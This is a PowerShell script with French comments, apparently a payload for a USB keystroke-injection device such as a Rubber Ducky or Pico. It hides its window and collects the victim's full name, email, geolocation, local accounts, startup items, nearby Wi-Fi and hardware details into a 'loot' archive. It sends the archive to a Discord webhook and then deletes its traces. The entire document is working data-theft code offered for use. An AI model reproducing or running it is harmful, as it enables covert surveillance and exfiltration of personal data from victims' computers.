# Masquer la fenêtre PowerShell
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $i -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

# Créer un dossier de loot temporaire
$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
$FileName = "$FolderName.txt"
$ZIP = "$FolderName.zip"
New-Item -Path "$env:TEMP\$FolderName" -ItemType Directory

# Récupération des informations système et réseau
function Get-fullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    } catch {
        Write-Error "No name was detected"
        return $env:UserName
    }
    return $fullName
}

function Get-email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    } catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }
}

function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }
        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoWatcher.Position.Location | Select Latitude, Longitude
        }
    } catch {
        Write-Error "No coordinates found"
        return "No Coordinates found"
    }
}

$fullName = Get-fullName
$email = Get-email
$GeoLocation = Get-GeoLocation
$GeoLocation = $GeoLocation -split " "
$Lat = $GeoLocation[0].Substring(11) -replace ".$"
$Lon = $GeoLocation[1].Substring(10) -replace ".$"

# Collecte des informations supplémentaires
$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String
$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
$NearbyWifi = try { (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim() } catch { "No nearby wifi networks detected" }

# Extraction des informations système
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerName = $computerSystem.Name
$computerModel = $computerSystem.Model
$computerManufacturer = $computerSystem.Manufacturer
$computerBIOS = Get-CimInstance CIM_BIOSElement | Out-String
$computerOs = (Get-WMIObject win32_operatingsystem) | Select Caption, Version | Out-String
$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List | Out-String
$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) } | Out-String

# Compilation des données
$output = @"
Full Name: $fullName
Email: $email
GeoLocation: Latitude: $Lat Longitude: $Lon
Local Users: $luser
Contents of Start Up Folder: $StartUp
Nearby Wifi: $NearbyWifi
Computer Name: $computerName
Model: $computerModel
Manufacturer: $computerManufacturer
BIOS: $computerBIOS
OS: $computerOs
CPU: $computerCpu
Ram Capacity: $computerRamCapacity
"@

$output > "$env:TEMP\$FolderName\computerData.txt"

# Compression du dossier loot
Compress-Archive -Path "$env:TEMP\$FolderName" -DestinationPath "$env:TEMP\$ZIP"

# Envoi des données à Discord via webhook
$discordWebhookUrl = $dc
$discordMessage = @{
    content = "$env:computername Stats from Ducky/Pico"
}
$jsonBody = $discordMessage | ConvertTo-Json
Invoke-RestMethod -ContentType 'Application/Json' -Uri $discordWebhookUrl -Method Post -Body $jsonBody

# Envoi du fichier zip via cURL
Start-Process curl.exe -ArgumentList @("-F", "file1=@$env:TEMP\$ZIP", $discordWebhookUrl) -NoNewWindow -Wait

# Nettoyage des fichiers temporaires
Remove-Item -Path "$env:TEMP\$FolderName" -Recurse -Force
Remove-Item -Path "$env:TEMP\$ZIP" -Force
